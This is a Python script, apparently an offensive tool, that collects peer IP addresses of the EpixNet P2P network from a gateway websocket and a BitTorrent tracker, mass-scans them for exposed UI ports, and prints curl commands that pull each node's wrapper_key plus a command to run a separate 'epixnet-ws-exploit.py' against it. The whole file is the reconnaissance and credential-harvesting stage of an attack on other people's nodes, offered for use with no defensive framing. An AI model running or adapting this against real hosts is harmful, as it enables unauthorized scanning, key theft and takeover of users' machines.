#!/usr/bin/env python3
"""
EpixNet P2P Peer Harvester — find non-restricted nodes via BitTorrent tracker

Usage:
    python3 epixnet-peer-harvest.py [--scan]

Steps:
    1. Connect to gateway.epixnet.io WS
    2. Get xite list + announcerStats for TCP peers
    3. Hit BitTorrent tracker for raw peer IPs+ports
    4. (Optional --scan) Probe each peer IP for port 42222 (UI port)

Output:
    List of peer IPs, and if --scan, those with UI port open.

    A peer with port 42222 open = potential non-restricted EpixNet node.
    Fetch dashboard HTML from it to extract wrapper_key, then run
    epixnet-ws-exploit.py against it.
"""
import sys
import json
import asyncio
import ssl
import socket
import struct
import urllib.request
import urllib.parse
import re
import concurrent.futures

GATEWAY_ADDR = "epix1dashanwfts3qcflekhmkvcz66ss4kxz2tr2k6g"
GATEWAY_WS = "wss://gateway.epixnet.io/EpixNet-Internal/Websocket"

async def harvest_peers(do_scan=False):
    import websockets

    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    uri = f"{GATEWAY_WS}?wrapper_key={GATEWAY_ADDR}"

    print("[*] Connecting to gateway WS...")
    async with websockets.connect(uri, ssl=ssl_ctx, open_timeout=10) as ws:
        async def send_cmd(cmd, cmd_id, params=None):
            await ws.send(json.dumps({"cmd": cmd, "id": cmd_id, "params": params or {}}))
            return json.loads(await asyncio.wait_for(ws.recv(), timeout=8))

        # 1. siteList
        print("[1] Getting xite list...")
        r = await send_cmd("siteList", 1)
        sites = r.get("result", [])
        print(f"    {len(sites)} xites on gateway")

        # 2. announcerStats for TCP peers
        print("\n[2] Getting announcer stats...")
        r = await send_cmd("announcerStats", 2)
        stats = r.get("result", {})

        tcp_peers = set()
        for tracker_url, info in stats.items():
            if tracker_url.startswith("tcp://") or tracker_url.startswith("epix://"):
                addr = tracker_url.split("://")[1]
                ip = addr.rsplit(":", 1)[0] if ":" in addr else addr
                tcp_peers.add(ip)
                status = info.get("status", "?") if isinstance(info, dict) else "?"
                print(f"    {tracker_url[:60]} status={status}")

        print(f"\n    {len(tcp_peers)} unique TCP peer IPs from WS")

    # 3. BitTorrent tracker announce
    print("\n[3] Hitting BitTorrent tracker for raw peers...")

    # Use the dashboard xite info_hash (derived from xite address)
    info_hash = bytes.fromhex("94aa48c5a7421a565d121acff85d5ca78fb6b5bf")
    encoded_hash = urllib.parse.quote(info_hash)

    url = (f"http://tracker.opentrackr.org:1337/announce"
           f"?info_hash={encoded_hash}"
           f"&peer_id=-EPX0001-{'a' * 13}"
           f"&port=48333&uploaded=0&downloaded=0&left=0&compact=1")

    try:
        req = urllib.request.Request(url, headers={"User-Agent": "EpixNet/0.4.17"})
        resp = urllib.request.urlopen(req, timeout=10)
        data = resp.read()
    except Exception as e:
        print(f"    [-] Tracker error: {e}")
        if not tcp_peers:
            return
        data = None

    peer_ips = set()
    if data:
        # Simple bencode parser
        def bdecode(data, idx=0):
            if data[idx:idx+1] == b'd':
                idx += 1
                d = {}
                while data[idx:idx+1] != b'e':
                    k, idx = bdecode(data, idx)
                    v, idx = bdecode(data, idx)
                    d[k] = v
                return d, idx + 1
            elif data[idx:idx+1] == b'l':
                idx += 1
                l = []
                while data[idx:idx+1] != b'e':
                    v, idx = bdecode(data, idx)
                    l.append(v)
                return l, idx + 1
            elif data[idx:idx+1] == b'i':
                idx += 1
                end = data.index(b'e', idx)
                return int(data[idx:end]), end + 1
            elif data[idx:idx+1].isdigit():
                colon = data.index(b':', idx)
                length = int(data[idx:colon])
                start = colon + 1
                return data[start:start+length], start + length
            else:
                return data[idx:], idx + 1

        decoded, _ = bdecode(data)
        peers_data = decoded.get(b'peers', b'')

        if isinstance(peers_data, bytes) and len(peers_data) >= 6:
            num_peers = len(peers_data) // 6
            print(f"    {num_peers} peers from tracker")
            for i in range(0, min(len(peers_data), num_peers * 6), 6):
                ip = ".".join(str(b) for b in peers_data[i:i+4])
                port = struct.unpack(">H", peers_data[i+4:i+6])[0]
                peer_ips.add(ip)
                if i // 6 < 20:
                    print(f"      {ip}:{port}")

    # Merge WS + tracker peers
    all_peers = tcp_peers | peer_ips
    print(f"\n[*] Total unique peer IPs: {len(all_peers)}")
    print(f"    {'\n    '.join(sorted(all_peers))}")

    # Save to file
    with open("/tmp/epixnet-peers.txt", "w") as f:
        for ip in sorted(all_peers):
            f.write(ip + "\n")
    print(f"\n[*] Saved to /tmp/epixnet-peers.txt")

    # 4. Optional: scan for UI port
    if do_scan:
        print("\n[4] Scanning for exposed UI ports (42222, 43110)...")
        ports = [42222, 43110]

        def check(ip, port, timeout=2):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                result = s.connect_ex((ip, port))
                s.close()
                return (ip, port, result == 0)
            except:
                return (ip, port, False)

        open_nodes = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
            futures = [ex.submit(check, ip, p) for ip in all_peers for p in ports]
            for f in concurrent.futures.as_completed(futures):
                ip, port, is_open = f.result()
                if is_open:
                    tag = " ← UI PORT" if port == 42222 else ""
                    print(f"    🔥 {ip}:{port}{tag}")
                    if port == 42222:
                        open_nodes.append((ip, port))

        if open_nodes:
            print(f"\n[!] Found {len(open_nodes)} node(s) with UI port open!")
            print("[*] Fetch dashboard HTML to extract wrapper_key, then run:")
            for ip, port in open_nodes:
                print(f"    curl http://{ip}:{port}/ | grep -oP 'wrapper_key\\s*=\\s*[\"'\\''\"]([a-f0-9]{64})'")
                print(f"    python3 epixnet-ws-exploit.py {ip} {port}")
        else:
            print("\n[-] No nodes with exposed UI ports found.")
            print("    [*] All peers bind UI to 127.0.0.1 (loopback only).")
            print("    [*] Look for nodes behind reverse proxy without ui_restrict.")


if __name__ == "__main__":
    do_scan = "--scan" in sys.argv
    asyncio.run(harvest_peers(do_scan))
